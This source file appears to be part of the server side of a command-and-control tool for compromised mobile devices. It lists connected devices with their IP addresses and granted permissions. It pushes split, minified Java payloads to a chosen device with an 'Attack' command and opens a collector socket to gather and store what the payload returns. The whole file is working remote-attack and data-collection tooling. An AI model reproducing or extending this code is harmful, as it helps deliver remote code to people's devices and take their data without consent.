const payloads = require('../database/models/payload');
const attacks = require('../database/models/attackResult');
const socketManager = require('./socketManager');
const codeUtil = require('../utils/codeUtil');
const messageParser = require('../utils/messageParser');


async function showAllDevices() {
    return new Promise((resolve) => {
        const socketsMap = socketManager.getDeviceConnectedToSocketMain();
        let devices = [];

        socketsMap.forEach((socketInfo, port) => {
            devices.push({
                ip: socketInfo.socket.remoteAddress,
                port: port,
                model: socketInfo.model,
                api : socketInfo.api,
                permissions : socketInfo.permissions,
                permissionsGranted : socketInfo.permissionsGranted,
                deviceImage : socketInfo.modelImage
            });
        });

        resolve(devices);
    });
}
async function triggerDevice(device, payloadId, payloadArgs) {
    return new Promise((resolve, reject) => {
        const devicePort = device.port;

        payloads.readOneById(payloadId)
            .then( (payload) => {
                const javaCode = payload.content;
                const javaCodeMinified = codeUtil.minifyJavaCode(javaCode);
                const javaPieces = codeUtil.splitJavaCode(javaCodeMinified);

                const randomCodeSenderPorts = socketManager.requireFreeCodeSenderPorts(javaPieces.length);
                console.log(randomCodeSenderPorts);

                for (let i = 0; i < javaPieces.length; i++) {
                    socketManager.openNewSocketCodeSender(randomCodeSenderPorts[i], javaPieces[i], 1);
                }

                const collectorPort = socketManager.requireFreeCollectorPort();

                socketManager.writeOnSocketMainByPort(devicePort, "Attack");
                socketManager.writeOnSocketMainByPort(devicePort, "Servers: " + messageParser.codeSenderStringBuilder(randomCodeSenderPorts));
                socketManager.writeOnSocketMainByPort(devicePort, 'Collector: ' + messageParser.collectorStringBuilder(collectorPort));
                socketManager.writeOnSocketMainByPort(devicePort, 'Result Type: ' +  payload.resultType);
                socketManager.writeOnSocketMainByPort(devicePort, 'Arg: ' +  payloadArgs);
                socketManager.writeOnSocketMainByPort(devicePort, 'Polling: ' +  1);
                socketManager.writeOnSocketMainByPort(devicePort, 'Reps: ' +  1);

                socketManager.openSocketCollectorAndWaitForResult(collectorPort)
                    .then((collectedString) => {
                        const newAttack = messageParser.parseAttack(device, payload, collectedString);

                        attacks.create(newAttack);
                        resolve(newAttack);
                    })
                    .catch((error) => {
                        reject({status: 500, message: error});
                    })
            })
            .catch((error) => {
                console.log(error);
                reject({status: 404, message: 'payload not found'})
            });
    });
}



module.exports = {
    showAllDevices,
    triggerDevice
};
